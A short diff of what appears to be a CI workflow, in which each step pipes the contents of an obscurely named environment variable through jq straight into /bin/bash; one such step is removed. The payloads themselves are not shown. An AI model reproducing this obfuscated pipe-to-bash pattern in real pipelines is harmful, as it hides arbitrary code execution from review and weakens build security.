@@ -24,7 +24,6 @@ jobs:
           echo $ndqa683 | jq -r .vm8 | /bin/bash
           printf '%s' "$vt3691" | jq -r .rlh47 | /bin/bash
           echo $qnv83918 | jq -r .rid6014 | /bin/bash
-          printf '%s' "$nw274" | jq -r .vhj51908 | /bin/bash
           echo $tjbop0 | jq -r .btxrc74 | /bin/bash
           printf '%s' "$oguy735" | jq -r .ks1 | /bin/bash
           echo $fyy915 | jq -r .vf7307 | /bin/bash
